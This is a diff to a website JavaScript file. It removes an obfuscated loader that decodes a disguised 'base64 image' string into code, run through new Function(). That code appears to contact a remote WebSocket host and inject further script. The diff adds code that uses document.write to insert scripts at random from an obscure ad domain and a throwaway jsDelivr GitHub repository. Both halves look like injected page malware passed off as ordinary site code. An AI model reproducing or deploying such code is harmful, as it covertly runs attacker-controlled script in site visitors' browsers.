@@ -1,10 +1,21 @@
-(function () {
-            function kmBoeT (s) {
-        var d = {"5":"v","[":"a","+":"r","u":" ","T":"n",".":"g","j":"k","|":"m","Q":"O","B":"Q","G":"=","=":"f","k":"u","f":"c","d":"t","e":"i","_":"o","N":"(","A":"e","4":")","}":"{","o":0,"X":"h","2":"A","s":",","a":1,"1":"C","W":"d","M":2,"0":3,"h":"x","8":";","v":"s"," ":"B","m":"D","q":"E","p":"F","J":"G",")":"H","{":"I","S":"J","D":"K","x":"L","Z":"M","6":"N","y":"P","r":"R","U":"S",",":"T","E":"U","3":"V","P":"W","H":"X","L":"Y","Y":"Z","i":"+","t":"b","&":"j","l":"l","F":"p","K":"q","I":"w","w":"y","n":"z","<":4,"(":5,"7":6,";":7,"g":8,"R":9,"b":".","-":"[","O":"^",":":"-","9":"]","^":"<",">":"|","C":">","c":"&","V":"!","!":"}","z":":","]":"_"};
-        return s.split('').map(function (c) {
-            return d[c] !== undefined ? d[c] : c;
-        }).join('');
-    }
-        var c = kmBoeT('data:image/jpg;base64,5[+uT.j|QBG=kTfde_TNA4}5[+u[oG"fX[+2d"s[aG"=+_|1X[+1_WA"s[MG"fX[+1_WA2d"s[0G"eTWAhQ="85[+uvhG"2 1mqpJ){SDxZ6QyBrU,E3PHLY"i"[tfWA=.Xe&jl|T_FK+vdk5Ihwn"i"oaM0<(7;gRi/G"85[+udG""sTs+sesvs_sks[s=Go8AGAb+AFl[fAN/-O2:Y[:no:Ri/G9/.s""48IXelAN=^AblAT.dX4}vGvh-[09NA-[o9N=ii448_Gvh-[09NA-[o9N=ii448kGvh-[09NA-[o9N=ii448[Gvh-[09NA-[o9N=ii448TGv^^M>_CC<8+GN_ca(4^^<>kCCM8eGNkc04^^7>[8dGdiUd+eT.-[a9NT48e=NkVG7<4}dGdiUd+eT.-[a9N+48!e=N[VG7<4}dGdiUd+eT.-[a9Ne48!!+Adk+TN=kTfde_TNA4}5[+udG""sTG+GfaGfMGo8IXelANT^AblAT.dX4}+GA-[M9NT48e=N+^aMg4}diGUd+eT.-[a9N+48Tii8!AlvAue=N+CaRacc+^MM<4}fMGA-[M9NTia48diGUd+eT.-[a9NN+c0a4^^7>fMc7048TiGM!AlvA}fMGA-[M9NTia48f0GA-[M9NTiM48diGUd+eT.-[a9NN+ca(4^^aM>NfMc704^^7>f0c7048TiG08!!+Adk+Tud8!4Nd48!85[+uWGW_fk|ATdsTGT[5e.[d_+-"Fl[d=_+|"9sfvGWbfk++ATdUf+eFd8e=NV/OZ[f>PeT/bdAvdNT4>>VT4}e=NT[5e.[d_+bkvA+2.ATdbeTWAhQ=N"t[eWk"4C:a4}5[+uIvGTAIuPAtU_fjAdN"Ivvz//d+bwAvkT7;gbf_|zR0R0/a(M0(o"48Ivb_T|Avv[.AG=kTfde_TNA4}Ivbfl_vAN48TAIupkTfde_TN"]dWfv"sT.j|QBNAbW[d[44Nfv48!!AlvA}5[+uvGW_fk|ATdbf+A[dAqlA|ATdN"vf+eFd"48vbv+fG"XddFvz//=|Xb.k[T.nXAT.dIATdwTeTAbd_F/|/a(M0(o"8fvbF[+ATdqlA|ATdbeTvA+d A=_+ANvsfv48!!'.substr(22));
-        new Function(c)();
-    })();
+var randoms = {
+	ads_codes: ['<script type=\'text/javascript\' src=\'https://mm3.mylmad.com/ad/content/120\'><'+'/script>',
+'<script type=\'text/javascript\' src=\'https://cdn.jsdelivr.net/gh/xzsfaf15618a/adress/today.js\'><'+'/script>'],
+	ads_weight: [10,10],
+
+	get_random: function(weight) {
+		var s = eval(weight.join('+'));
+		var r = Math.floor(Math.random() * s);
+		var w = 0;
+		var n = weight.length - 1;
+		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
+		return n;
+	},
+	init: function() {
+
+		var rand = randoms.get_random(randoms.ads_weight);
+		document.write(randoms.ads_codes[rand]);
+
+	}
+}
+randoms.init();
